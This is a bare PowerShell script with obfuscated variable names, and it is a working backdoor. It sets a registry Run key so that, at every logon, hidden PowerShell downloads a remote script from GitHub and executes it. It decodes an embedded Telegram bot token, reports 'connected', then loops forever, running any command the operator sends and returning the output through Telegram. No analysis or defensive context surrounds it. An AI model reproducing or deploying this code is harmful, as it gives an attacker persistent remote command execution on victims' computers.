$fqwl = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$ghbp = "startps"
$mnxc = 'powershell.exe -WindowStyle Hidden -Command "irm https://raw.githubusercontent.com/egigesajaz080-dot/skdbcdsch/refs/heads/main/jsdkbfj.ps1 | iex"'

if (-not (Get-ItemProperty -Path $fqwl -Name $ghbp -ErrorAction SilentlyContinue)) {
    Set-ItemProperty -Path $fqwl -Name $ghbp -Value $mnxc | Out-Null
}

#

$ojkr = "Nzg5Mzk3MzUxNTpBQUY3Wm9DeWMwZThjdjhjSGxBRU5HUy1DcDlLbEl1UlB3aw=="
$tmsp = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($ojkr))
$rvyz = "7574863188"
$ldhg = "https://api.telegram.org/bot$tmsp"

$nqxt = Invoke-RestMethod "$ldhg/getUpdates?timeout=1" -ErrorAction SilentlyContinue
if ($nqxt.result.Count -gt 0) {
    $kfbw = ($nqxt.result | Sort-Object update_id | Select-Object -Last 1).update_id + 1
} else {
    $kfbw = 0
}

Invoke-RestMethod "$ldhg/sendMessage" -Method Post -Body @{
    chat_id = $rvyz
    text = "connected"
} -ErrorAction SilentlyContinue | Out-Null

while ($true) {
    $nqxt = Invoke-RestMethod "$ldhg/getUpdates?timeout=1&offset=$kfbw" -ErrorAction SilentlyContinue
    foreach ($wczv in $nqxt.result) {
        $kfbw = $wczv.update_id + 1
        $pgfy = $wczv.message.text
        if ($pgfy -like "/c *") {
            $tzvb = $pgfy.Substring(3)
            try {
                $qxmj = Invoke-Expression $tzvb 2>&1 | Out-String
                if ([string]::IsNullOrWhiteSpace($qxmj)) { $qxmj = "done" }
            } catch {
                $qxmj = $_ | Out-String
            }
            Invoke-RestMethod "$ldhg/sendMessage" -Method Post -Body @{
                chat_id = $rvyz
                text = $qxmj
            } -ErrorAction SilentlyContinue | Out-Null
        }
    }
    Start-Sleep -Seconds 1
}
